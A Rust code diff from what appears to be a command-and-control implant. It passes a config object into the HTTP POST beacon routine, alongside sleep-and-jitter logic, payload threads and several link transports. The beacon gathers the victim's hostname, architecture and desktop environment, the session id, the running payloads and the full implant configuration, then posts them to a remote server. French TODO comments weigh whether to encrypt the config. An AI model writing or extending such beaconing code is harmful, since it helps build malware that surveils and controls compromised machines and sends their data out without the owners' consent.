@@ -42,7 +42,7 @@ impl Link {
         advanced: &Advanced,
         link_nb: i32,session_id: &String,running_thread: &Vec<Payload>
     ) -> Result<Config, anyhow::Error> {
-        let result = self.fetch_data_with_post(session_id,running_thread);
+        let result = self.fetch_data_with_post(session_id,running_thread, config);
         let data: Vec<u8> = match result {
             Ok(data) => data,
             Err(error) => bail!(
@@ -137,7 +137,7 @@ pub struct HTTPPostLink {
 
 pub trait LinkFetch {
     fn download_data(&self) -> Result<Vec<u8>, anyhow::Error>;
-    fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>) -> Result<Vec<u8>, anyhow::Error>;
+    fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>, config:&Config) -> Result<Vec<u8>, anyhow::Error>;
     fn get_target(&self) -> String;
     fn get_dataoperation(&self) -> Vec<DataOperation>;
     fn get_sleep(&self) -> u64;
@@ -169,10 +169,10 @@ pub trait LinkFetch {
         self.un_apply_all_dataoperations(data)
     }
 
-    fn fetch_data_with_post(&self,session_id: &String,running_thread: &Vec<Payload>
+    fn fetch_data_with_post(&self,session_id: &String,running_thread: &Vec<Payload>, config:&Config
 ) -> Result<Vec<u8>, anyhow::Error> {
         self.sleep_and_jitt();
-        let data = self.download_data_post(session_id,running_thread)?;
+        let data = self.download_data_post(session_id,running_thread,config)?;
         self.un_apply_all_dataoperations(data)
     }
 
@@ -193,14 +193,14 @@ impl LinkFetch for Link {
         }
     }
 
-    fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>
+    fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>, config:&Config
 ) -> Result<Vec<u8>, anyhow::Error> {
         match &self {
             Link::HTTP(link) => link.download_data(),
             Link::DNS(link) => link.download_data(),
             Link::FILE(link) => link.download_data(),
             Link::MEMORY(link) => link.download_data(),
-            Link::HTTPost(link) => link.fetch_data_with_post(session_id,running_thread),
+            Link::HTTPost(link) => link.fetch_data_with_post(session_id,running_thread,config),
         }
     }
 
@@ -249,7 +249,7 @@ impl LinkFetch for FileLink {
         let file_bytes: Vec<u8> = fs::read(self.get_target())?;
         Ok(file_bytes)
     }
-    fn download_data_post(&self,_session_id: &String,_running_thread: &Vec<Payload>
+    fn download_data_post(&self,_session_id: &String,_running_thread: &Vec<Payload>, _config:&Config
     ) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
@@ -334,7 +334,7 @@ impl LinkFetch for MemoryLink {
             _ => Ok(vec![]),
         }
     }
-    fn download_data_post(&self,_session_id: &String,_running_thread: &Vec<Payload>
+    fn download_data_post(&self,_session_id: &String,_running_thread: &Vec<Payload>, _config:&Config
     ) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
@@ -357,7 +357,7 @@ impl LinkFetch for DNSLink {
     fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
-    fn download_data_post(&self,_session_id: &String,_running_thread: &Vec<Payload>
+    fn download_data_post(&self,_session_id: &String,_running_thread: &Vec<Payload>, _config:&Config
     ) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
@@ -388,7 +388,7 @@ impl LinkFetch for HTTPLink {
         res.read_to_end(&mut body)?;
         Ok(body)
     }
-    fn download_data_post(&self,_session_id: &String,_running_thread: &Vec<Payload>
+    fn download_data_post(&self,_session_id: &String,_running_thread: &Vec<Payload>, _config:&Config
     ) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
@@ -412,7 +412,7 @@ impl LinkFetch for HTTPPostLink {
         todo!()
     }
 
-    fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>
+    fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>, config:&Config
     ) -> Result<Vec<u8>, anyhow::Error> {
         let mut map: HashMap<&str, String> = HashMap::new();
 
@@ -421,23 +421,16 @@ impl LinkFetch for HTTPPostLink {
         map.insert("desktop_env", whoami::desktop_env().to_string());
         map.insert("arch", whoami::arch().to_string());
         map.insert("hostname", whoami::devicename());
-        //TODO send real data
-        map.insert("loader", "todo".to_string());
         map.insert("session_id", session_id.to_string());
-        map.insert("config", "".to_string());
-        //let data = serde_json::from_value(running_thread).unwrap();
-        let data = serde_json::to_string(running_thread).unwrap();       
-        //let t = format!("{:?}", running_thread);
+        // TODO comment transformer en jolie JSON ici ? ->  serde_json::to_string(running_thread).unwrap();
+        map.insert("running-thread", format!("{:?}", running_thread));
+        // TODO reflechir. est-ce qu'on envoit la config ?? c'est lourd et il faudrait la chiffrer a fond
+        map.insert("config", format!("{:?}", config));
+        // TODO, il faudrait l'extraire de la config, on pourrait ajouter un nom a chaque config
+        map.insert("loader", "todo".to_string());
+        //TODO send real data
+        map.insert("working-link", "todo".to_string());
 
-        //map.insert("running-thread", "".to_string());
-        map.insert("running-thread", data);
-        map.insert("working-link", "".to_string());
-        //TODO
-        //map.insert("lang",whoami::distro());
-        //map.insert("domain",domain_name());
-
-        // Create a new client object
-        //let client = reqwest::blocking::Client::new();
         let client = reqwest::blocking::Client::builder()
             .timeout(Duration::from_secs(TIMEOUT))
             .user_agent(USER_AGENT)
